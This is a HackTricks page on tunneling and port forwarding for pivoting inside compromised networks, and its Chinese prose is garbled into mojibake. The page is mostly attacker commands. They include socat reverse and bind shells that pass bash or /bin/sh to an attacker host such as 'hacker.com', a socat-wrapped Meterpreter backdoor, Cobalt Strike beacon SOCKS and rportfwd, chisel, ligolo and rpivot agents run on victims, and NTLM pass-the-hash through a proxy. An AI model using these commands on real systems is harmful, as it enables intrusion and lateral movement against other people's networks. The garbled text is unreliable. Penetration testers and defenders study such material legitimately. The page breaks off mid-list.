<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Tunneling and Port Forwarding</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="éš§é“å’Œç«¯å£è½¬å‘"><a class="header" href="#éš§é“å’Œç«¯å£è½¬å‘">éš§é“å’Œç«¯å£è½¬å‘</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="nmap-æç¤º"><a class="header" href="#nmap-æç¤º">Nmap æç¤º</a></h2>
<p>{% hint style="warning" %}
<strong>ICMP</strong> å’Œ <strong>SYN</strong> æ‰«ææ— æ³•é€šè¿‡ socks ä»£ç†è¿›è¡Œéš§é“ä¼ è¾“ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡» <strong>ç¦ç”¨ ping æ¢æµ‹</strong> (<code>-Pn</code>) å¹¶æŒ‡å®š <strong>TCP æ‰«æ</strong> (<code>-sT</code>) ä»¥ä½¿å…¶å·¥ä½œã€‚
{% endhint %}</p>
<h2 id="bash"><a class="header" href="#bash"><strong>Bash</strong></a></h2>
<p><strong>ä¸»æœº -&gt; è·³è½¬ -&gt; å†…éƒ¨A -&gt; å†…éƒ¨B</strong></p>
<pre><code class="language-bash"># On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0&lt;backpipe | nc -lvnp 3333 1&gt;backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3&lt;&gt;/dev/tcp/internalB/5985
exec 4&lt;&gt;/dev/tcp/Jump/3333
cat &lt;&amp;3 &gt;&amp;4 &amp;
cat &lt;&amp;4 &gt;&amp;3 &amp;

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
</code></pre>
<h2 id="ssh"><a class="header" href="#ssh"><strong>SSH</strong></a></h2>
<p>SSH å›¾å½¢è¿æ¥ (X)</p>
<pre><code class="language-bash">ssh -Y -C &lt;user&gt;@&lt;ip&gt; #-Y is less secure but faster than -X
</code></pre>
<h3 id="local-port2port"><a class="header" href="#local-port2port">Local Port2Port</a></h3>
<p>åœ¨SSHæœåŠ¡å™¨ä¸­æ‰“å¼€æ–°ç«¯å£ --&gt; å…¶ä»–ç«¯å£</p>
<pre><code class="language-bash">ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
</code></pre>
<pre><code class="language-bash">ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
</code></pre>
<h3 id="port2port"><a class="header" href="#port2port">Port2Port</a></h3>
<p>æœ¬åœ°ç«¯å£ --&gt; è¢«æ”»é™·çš„ä¸»æœº (SSH) --&gt; ç¬¬ä¸‰æ–¹_ç›’å­:ç«¯å£</p>
<pre><code class="language-bash">ssh -i ssh_key &lt;user&gt;@&lt;ip_compromised&gt; -L &lt;attacker_port&gt;:&lt;ip_victim&gt;:&lt;remote_port&gt; [-p &lt;ssh_port&gt;] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:&lt;ip_victim&gt;:631 -N -f -l &lt;username&gt; &lt;ip_compromised&gt;
</code></pre>
<h3 id="port2hostnet-proxychains"><a class="header" href="#port2hostnet-proxychains">Port2hostnet (proxychains)</a></h3>
<p>æœ¬åœ°ç«¯å£ --&gt; è¢«æ”»é™·çš„ä¸»æœº (SSH) --&gt; ä»»ä½•åœ°æ–¹</p>
<pre><code class="language-bash">ssh -f -N -D &lt;attacker_port&gt; &lt;username&gt;@&lt;ip_compromised&gt; #All sent to local port will exit through the compromised server (use as proxy)
</code></pre>
<h3 id="åå‘ç«¯å£è½¬å‘"><a class="header" href="#åå‘ç«¯å£è½¬å‘">åå‘ç«¯å£è½¬å‘</a></h3>
<p>è¿™å¯¹äºé€šè¿‡ DMZ ä»å†…éƒ¨ä¸»æœºè·å–åå‘ shell åˆ°æ‚¨çš„ä¸»æœºéå¸¸æœ‰ç”¨ï¼š</p>
<pre><code class="language-bash">ssh -i dmz_key -R &lt;dmz_internal_ip&gt;:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
</code></pre>
<h3 id="vpn-tunnel"><a class="header" href="#vpn-tunnel">VPN-Tunnel</a></h3>
<p>æ‚¨éœ€è¦<strong>åœ¨ä¸¤ä¸ªè®¾å¤‡ä¸Šå…·æœ‰rootæƒé™</strong>ï¼ˆå› ä¸ºæ‚¨å°†åˆ›å»ºæ–°çš„æ¥å£ï¼‰ï¼Œå¹¶ä¸”sshdé…ç½®å¿…é¡»å…è®¸rootç™»å½•ï¼š<br />
<code>PermitRootLogin yes</code><br />
<code>PermitTunnel yes</code></p>
<pre><code class="language-bash">ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
</code></pre>
<p>åœ¨æœåŠ¡å™¨ç«¯å¯ç”¨è½¬å‘</p>
<pre><code class="language-bash">echo 1 &gt; /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
</code></pre>
<p>åœ¨å®¢æˆ·ç«¯è®¾ç½®æ–°è·¯ç”±</p>
<pre><code>route add -net 10.0.0.0/16 gw 1.1.1.1
</code></pre>
<h2 id="sshuttle"><a class="header" href="#sshuttle">SSHUTTLE</a></h2>
<p>æ‚¨å¯ä»¥é€šè¿‡ <strong>ssh</strong> å°†æ‰€æœ‰ <strong>æµé‡</strong> é€šè¿‡ä¸»æœº <strong>éš§é“</strong> åˆ° <strong>å­ç½‘ç»œ</strong>ã€‚<br />
ä¾‹å¦‚ï¼Œè½¬å‘æ‰€æœ‰å‘é€åˆ° 10.10.10.0/24 çš„æµé‡ã€‚</p>
<pre><code class="language-bash">pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
</code></pre>
<p>ä½¿ç”¨ç§é’¥è¿æ¥</p>
<pre><code class="language-bash">sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
</code></pre>
<h2 id="meterpreter"><a class="header" href="#meterpreter">Meterpreter</a></h2>
<h3 id="port2port-1"><a class="header" href="#port2port-1">Port2Port</a></h3>
<p>æœ¬åœ°ç«¯å£ --&gt; è¢«æ”»é™·çš„ä¸»æœºï¼ˆæ´»åŠ¨ä¼šè¯ï¼‰ --&gt; ç¬¬ä¸‰æ–¹_ç›’å­:ç«¯å£</p>
<pre><code class="language-bash"># Inside a meterpreter session
portfwd add -l &lt;attacker_port&gt; -p &lt;Remote_port&gt; -r &lt;Remote_host&gt;
</code></pre>
<h3 id="socks"><a class="header" href="#socks">SOCKS</a></h3>
<pre><code class="language-bash">background# meterpreter session
route add &lt;IP_victim&gt; &lt;Netmask&gt; &lt;Session&gt; # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" &gt; /etc/proxychains.conf #Proxychains
</code></pre>
<p>å¦ä¸€ç§æ–¹æ³•ï¼š</p>
<pre><code class="language-bash">background #meterpreter session
use post/multi/manage/autoroute
set SESSION &lt;session_n&gt;
set SUBNET &lt;New_net_ip&gt; #Ex: set SUBNET 10.1.13.0
set NETMASK &lt;Netmask&gt;
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" &gt; /etc/proxychains.conf #Proxychains
</code></pre>
<h2 id="cobalt-strike"><a class="header" href="#cobalt-strike">Cobalt Strike</a></h2>
<h3 id="socks-ä»£ç†"><a class="header" href="#socks-ä»£ç†">SOCKS ä»£ç†</a></h3>
<p>åœ¨ teamserver ä¸­æ‰“å¼€ä¸€ä¸ªç«¯å£ï¼Œç›‘å¬æ‰€æœ‰æ¥å£ï¼Œä»¥ä¾¿å¯ä»¥ç”¨æ¥ <strong>é€šè¿‡ beacon è·¯ç”±æµé‡</strong>ã€‚</p>
<pre><code class="language-bash">beacon&gt; socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
</code></pre>
<h3 id="rport2port"><a class="header" href="#rport2port">rPort2Port</a></h3>
<p>{% hint style="warning" %}
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<strong>ç«¯å£åœ¨ä¿¡æ ‡ä¸»æœºä¸Šæ‰“å¼€</strong>ï¼Œè€Œä¸æ˜¯åœ¨å›¢é˜ŸæœåŠ¡å™¨ä¸Šï¼Œæµé‡è¢«å‘é€åˆ°å›¢é˜ŸæœåŠ¡å™¨ï¼Œç„¶åä»é‚£é‡Œå‘é€åˆ°æŒ‡å®šçš„ä¸»æœº:ç«¯å£
{% endhint %}</p>
<pre><code class="language-bash">rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
</code></pre>
<p>To note:</p>
<ul>
<li>Beaconçš„åå‘ç«¯å£è½¬å‘æ—¨åœ¨<strong>å°†æµé‡éš§é“åˆ°å›¢é˜ŸæœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯åœ¨å•ä¸ªæœºå™¨ä¹‹é—´ä¸­ç»§</strong>ã€‚</li>
<li>æµé‡æ˜¯<strong>åœ¨Beaconçš„C2æµé‡ä¸­éš§é“åŒ–</strong>ï¼ŒåŒ…æ‹¬P2Pé“¾æ¥ã€‚</li>
<li><strong>ä¸éœ€è¦ç®¡ç†å‘˜æƒé™</strong>æ¥åœ¨é«˜ç«¯å£ä¸Šåˆ›å»ºåå‘ç«¯å£è½¬å‘ã€‚</li>
</ul>
<h3 id="rport2port-local"><a class="header" href="#rport2port-local">rPort2Port local</a></h3>
<p>{% hint style="warning" %}
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<strong>ç«¯å£åœ¨beaconä¸»æœºä¸Šæ‰“å¼€</strong>ï¼Œè€Œä¸æ˜¯åœ¨å›¢é˜ŸæœåŠ¡å™¨ä¸Šï¼Œ<strong>æµé‡å‘é€åˆ°Cobalt Strikeå®¢æˆ·ç«¯</strong>ï¼ˆè€Œä¸æ˜¯å›¢é˜ŸæœåŠ¡å™¨ï¼‰ï¼Œç„¶åä»é‚£é‡Œå‘é€åˆ°æŒ‡å®šçš„ä¸»æœº:ç«¯å£
{% endhint %}</p>
<pre><code>rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
</code></pre>
<h2 id="regeorg"><a class="header" href="#regeorg">reGeorg</a></h2>
<p><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
<p>æ‚¨éœ€è¦ä¸Šä¼ ä¸€ä¸ªç½‘ç»œæ–‡ä»¶éš§é“ï¼šashx|aspx|js|jsp|php|php|jsp</p>
<pre><code class="language-bash">python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
</code></pre>
<h2 id="chisel"><a class="header" href="#chisel">Chisel</a></h2>
<p>æ‚¨å¯ä»¥ä» <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a> çš„å‘å¸ƒé¡µé¢ä¸‹è½½å®ƒã€‚<br />
æ‚¨éœ€è¦ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä½¿ç”¨ <strong>ç›¸åŒç‰ˆæœ¬</strong></p>
<h3 id="socks-1"><a class="header" href="#socks-1">socks</a></h3>
<pre><code class="language-bash">./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
</code></pre>
<h3 id="ç«¯å£è½¬å‘"><a class="header" href="#ç«¯å£è½¬å‘">ç«¯å£è½¬å‘</a></h3>
<pre><code class="language-bash">./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
</code></pre>
<h2 id="ligolo-ng"><a class="header" href="#ligolo-ng">Ligolo-ng</a></h2>
<p><a href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a></p>
<p><strong>ä»£ç†å’Œä»£ç†ä½¿ç”¨ç›¸åŒç‰ˆæœ¬</strong></p>
<h3 id="éš§é“æŠ€æœ¯"><a class="header" href="#éš§é“æŠ€æœ¯">éš§é“æŠ€æœ¯</a></h3>
<pre><code class="language-bash"># Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect &lt;ip_proxy&gt;:11601 -v -accept-fingerprint &lt;fingerprint&gt;
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route &lt;network_address_agent&gt;/&lt;netmask_agent&gt;
# Display the tun interfaces -- Attacker
interface_list
</code></pre>
<h3 id="ä»£ç†ç»‘å®šå’Œç›‘å¬"><a class="header" href="#ä»£ç†ç»‘å®šå’Œç›‘å¬">ä»£ç†ç»‘å®šå’Œç›‘å¬</a></h3>
<pre><code class="language-bash"># Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
</code></pre>
<h3 id="è®¿é—®ä»£ç†çš„æœ¬åœ°ç«¯å£"><a class="header" href="#è®¿é—®ä»£ç†çš„æœ¬åœ°ç«¯å£">è®¿é—®ä»£ç†çš„æœ¬åœ°ç«¯å£</a></h3>
<pre><code class="language-bash"># Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
</code></pre>
<h2 id="rpivot"><a class="header" href="#rpivot">Rpivot</a></h2>
<p><a href="https://github.com/klsecservices/rpivot">https://github.com/klsecservices/rpivot</a></p>
<p>åå‘éš§é“ã€‚éš§é“ä»å—å®³è€…å¼€å§‹ã€‚<br />
åœ¨ 127.0.0.1:1080 ä¸Šåˆ›å»ºä¸€ä¸ª socks4 ä»£ç†ã€‚</p>
<pre><code class="language-bash">attacker&gt; python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
</code></pre>
<pre><code class="language-bash">victim&gt; python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999
</code></pre>
<p>é€šè¿‡ <strong>NTLM ä»£ç†</strong> è¿›è¡Œæ¢è½¬</p>
<pre><code class="language-bash">victim&gt; python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
</code></pre>
<pre><code class="language-bash">victim&gt; python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
</code></pre>
<h2 id="socat"><a class="header" href="#socat"><strong>Socat</strong></a></h2>
<p><a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a></p>
<h3 id="ç»‘å®š-shell"><a class="header" href="#ç»‘å®š-shell">ç»‘å®š shell</a></h3>
<pre><code class="language-bash">victim&gt; socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker&gt; socat FILE:`tty`,raw,echo=0 TCP4:&lt;victim_ip&gt;:1337
</code></pre>
<h3 id="åå‘-shell"><a class="header" href="#åå‘-shell">åå‘ shell</a></h3>
<pre><code class="language-bash">attacker&gt; socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim&gt; socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
</code></pre>
<h3 id="port2port-2"><a class="header" href="#port2port-2">Port2Port</a></h3>
<pre><code class="language-bash">socat TCP4-LISTEN:&lt;lport&gt;,fork TCP4:&lt;redirect_ip&gt;:&lt;rport&gt; &amp;
</code></pre>
<h3 id="é€šè¿‡socksçš„port2port"><a class="header" href="#é€šè¿‡socksçš„port2port">é€šè¿‡socksçš„Port2Port</a></h3>
<pre><code class="language-bash">socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
</code></pre>
<h3 id="é€šè¿‡-ssl-socat-çš„-meterpreter"><a class="header" href="#é€šè¿‡-ssl-socat-çš„-meterpreter">é€šè¿‡ SSL Socat çš„ Meterpreter</a></h3>
<pre><code class="language-bash">#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker&gt; socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
</code></pre>
<pre><code class="language-bash">victim&gt; socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
</code></pre>
<p>æ‚¨å¯ä»¥é€šè¿‡åœ¨å—å®³è€…çš„æ§åˆ¶å°ä¸­æ‰§è¡Œè¿™ä¸€è¡Œæ¥ç»•è¿‡<strong>éè®¤è¯ä»£ç†</strong>ï¼š</p>
<pre><code class="language-bash">OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
</code></pre>
<h3 id="ssl-socat-tunnel"><a class="header" href="#ssl-socat-tunnel">SSL Socat Tunnel</a></h3>
<p><strong>/bin/sh æ§åˆ¶å°</strong></p>
<p>åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸¤ä¾§åˆ›å»ºè¯ä¹¦ï¼š</p>
<pre><code class="language-bash"># Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt &gt;$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
</code></pre>
<pre><code class="language-bash">attacker-listener&gt; socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim&gt; socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
</code></pre>
<h3 id="remote-port2port"><a class="header" href="#remote-port2port">Remote Port2Port</a></h3>
<p>å°†æœ¬åœ° SSH ç«¯å£ (22) è¿æ¥åˆ°æ”»å‡»è€…ä¸»æœºçš„ 443 ç«¯å£</p>
<pre><code class="language-bash">attacker&gt; sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim&gt; while true; do socat TCP4:&lt;attacker&gt;:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker&gt; ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
</code></pre>
<h2 id="plinkexe"><a class="header" href="#plinkexe">Plink.exe</a></h2>
<p>å®ƒå°±åƒä¸€ä¸ªæ§åˆ¶å°ç‰ˆæœ¬çš„PuTTYï¼ˆé€‰é¡¹ä¸sshå®¢æˆ·ç«¯éå¸¸ç›¸ä¼¼ï¼‰ã€‚</p>
<p>ç”±äºè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å°†åœ¨å—å®³è€…çš„æœºå™¨ä¸Šæ‰§è¡Œï¼Œå¹¶ä¸”å®ƒæ˜¯ä¸€ä¸ªsshå®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰“å¼€æˆ‘ä»¬çš„sshæœåŠ¡å’Œç«¯å£ï¼Œä»¥ä¾¿èƒ½å¤Ÿå»ºç«‹åå‘è¿æ¥ã€‚ç„¶åï¼Œå°†ä»…æœ¬åœ°å¯è®¿é—®çš„ç«¯å£è½¬å‘åˆ°æˆ‘ä»¬æœºå™¨ä¸Šçš„ä¸€ä¸ªç«¯å£ï¼š</p>
<pre><code class="language-bash">echo y | plink.exe -l &lt;Our_valid_username&gt; -pw &lt;valid_password&gt; [-p &lt;port&gt;] -R &lt;port_ in_our_host&gt;:&lt;next_ip&gt;:&lt;final_port&gt; &lt;your_ip&gt;
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
</code></pre>
<h2 id="windows-netsh"><a class="header" href="#windows-netsh">Windows netsh</a></h2>
<h3 id="port2port-3"><a class="header" href="#port2port-3">Port2Port</a></h3>
<p>æ‚¨éœ€è¦æ˜¯æœ¬åœ°ç®¡ç†å‘˜ï¼ˆå¯¹äºä»»ä½•ç«¯å£ï¼‰</p>
<pre><code class="language-bash">netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
</code></pre>
<h2 id="socksoverrdp--proxifier"><a class="header" href="#socksoverrdp--proxifier">SocksOverRDP &amp; Proxifier</a></h2>
<p>æ‚¨éœ€è¦æ‹¥æœ‰<strong>ç³»ç»Ÿçš„RDPè®¿é—®æƒé™</strong>ã€‚<br />
ä¸‹è½½ï¼š</p>
<ol>
